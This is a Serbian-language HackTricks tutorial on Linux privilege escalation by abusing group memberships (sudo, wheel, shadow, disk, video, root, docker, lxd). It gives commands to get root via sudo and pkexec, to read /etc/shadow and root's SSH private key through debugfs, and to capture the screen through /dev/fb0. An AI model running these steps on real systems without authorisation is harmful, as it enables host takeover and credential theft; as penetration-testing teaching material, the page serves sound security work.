<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>


# Sudo/Admin Grupa

## **PE - Metoda 1**

**Ponekad**, **podrazumevano \(ili zato što neki softver to zahteva\)** unutar **/etc/sudoers** fajla možete pronaći neke od ovih linija:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Ovo znači da **svaki korisnik koji pripada grupi sudo ili admin može izvršiti bilo šta kao sudo**.

Ako je to slučaj, da **postanete root samo izvršite**:
```text
sudo su
```
## PE - Metoda 2

Pronađite sve suid binarne datoteke i proverite da li postoji binarna datoteka **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Ako otkrijete da je binarna datoteka pkexec SUID binarna datoteka i da pripadate grupi sudo ili admin, verovatno možete izvršavati binarne datoteke kao sudo koristeći pkexec.
Proverite sadržaj:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Ovde ćete pronaći koje grupe imaju dozvolu da izvršavaju **pkexec** i **podrazumevano** u nekim Linux distribucijama se mogu pojaviti grupe poput **sudo** ili **admin**.

Da biste **postali root, možete izvršiti**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Ako pokušate da izvršite **pkexec** i dobijete ovu **grešku**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Nije zato što nemate dozvole, već zato što niste povezani bez grafičkog korisničkog interfejsa**. Postoji način da se ovo reši ovde: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Potrebne su vam **2 različite SSH sesije**:

{% code title="sesija1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% code title="sesija2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

# Wheel grupa

**Ponekad**, **podrazumevano** unutar **/etc/sudoers** fajla možete pronaći ovu liniju:
```text
%wheel	ALL=(ALL:ALL) ALL
```
Ovo znači da **svaki korisnik koji pripada grupi wheel može izvršiti bilo šta kao sudo**.

Ako je to slučaj, da **postanete root samo izvršite**:
```text
sudo su
```
# Shadow grupa

Korisnici iz **shadow grupe** mogu **čitati** fajl **/etc/shadow**:
```text
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
# Disk grupa

Ova privilegija je skoro **ekvivalentna pristupu root-u** jer omogućava pristup svim podacima unutar mašine.

Fajlovi: `/dev/sd[a-z][1-9]`
```text
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Imajte na umu da pomoću debugfs-a takođe možete **pisati datoteke**. Na primer, da biste kopirali `/tmp/asd1.txt` u `/tmp/asd2.txt`, možete uraditi:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Međutim, ako pokušate **pisati datoteke koje su vlasništvo root-a** (poput `/etc/shadow` ili `/etc/passwd`), dobićete grešku "**Permission denied**".

# Video grupa

Koristeći komandu `w` možete pronaći **ko je prijavljen na sistemu** i prikazaće se izlaz kao u sledećem primeru:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** znači da je korisnik **yossi fizički prijavljen** na terminal na mašini.

Grupa **video** ima pristup za pregledanje izlaza ekrana. U osnovi, možete posmatrati ekrane. Da biste to uradili, trebate **uzeti trenutnu sliku ekrana** u sirovim podacima i dobiti rezoluciju koju ekran koristi. Podaci ekrana mogu biti sačuvani u `/dev/fb0`, a rezoluciju ovog ekrana možete pronaći na `/sys/class/graphics/fb0/virtual_size`.
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Da biste **otvorili** **sirovu sliku**, možete koristiti **GIMP**, izaberite datoteku **`screen.raw`** i odaberite kao vrstu datoteke **Podaci o sirovoj slici**:

![](../../.gitbook/assets/image%20%28208%29.png)

Zatim promenite širinu i visinu na one koje se koriste na ekranu i proverite različite vrste slika \(i odaberite onu koja najbolje prikazuje ekran\):

![](../../.gitbook/assets/image%20%28295%29.png)

# Root Grupa

Izgleda da **članovi root grupe** podrazumevano mogu imati pristup za **izmenu** nekih **konfiguracionih datoteka servisa** ili nekih **biblioteka** ili **drugih interesantnih stvari** koje se mogu koristiti za eskalaciju privilegija...

**Proverite koje datoteke članovi root grupe mogu menjati**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
# Docker grupa

Možete montirati korenski fajl sistem host mašine na volumen instance, tako da kada se instanca pokrene, odmah učitava `chroot` u taj volumen. Ovo vam efektivno daje root pristup mašini.

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

# lxc/lxd Grupa

[lxc - Eskalacija privilegija](lxd-privilege-escalation.md)



<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini da podržite HackTricks:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
